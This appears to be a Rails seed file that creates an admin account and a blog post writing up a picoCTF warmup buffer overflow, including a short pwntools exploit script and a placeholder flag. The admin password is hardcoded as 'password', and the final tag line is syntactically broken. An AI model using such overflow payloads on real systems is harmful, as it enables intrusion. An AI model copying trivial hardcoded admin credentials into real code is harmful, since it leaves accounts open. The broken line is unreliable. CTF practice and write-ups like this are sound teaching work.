admin = Admin.find_or_create_by!(email: 'kepha@gmail.com') do |admin|
    admin.password = 'password'
end

post = Post.find_or_create_by!(title: "picoCTF - Warmup Buffer Overflow") do |post|
    post.category = "ctf"
    post.difficulty = "Easy"
    post.published = true
    post.posted_at = Time.current
    post.body = <<~MARKDOWN
        ## Challenge Description
        A simple stack buffer overflow to get comfortable with `gdb` and `pwntools`.

        ```python
        #!/usr/bin/env python3
        from pwn import *

        io = process('./vuln')
        payload = b'A' * 40 + p64(0x4011b6)
        io.sendline(payload)
        io.interactive()
        ```

        <details>
        <summary>Flag</summary>
        `picoCTF{warmup_flag_example}`
        </details>
    MARKDOWN
end

post tag_names = "picoCTF, buffer overflow, gdb, pwntools"
post.save!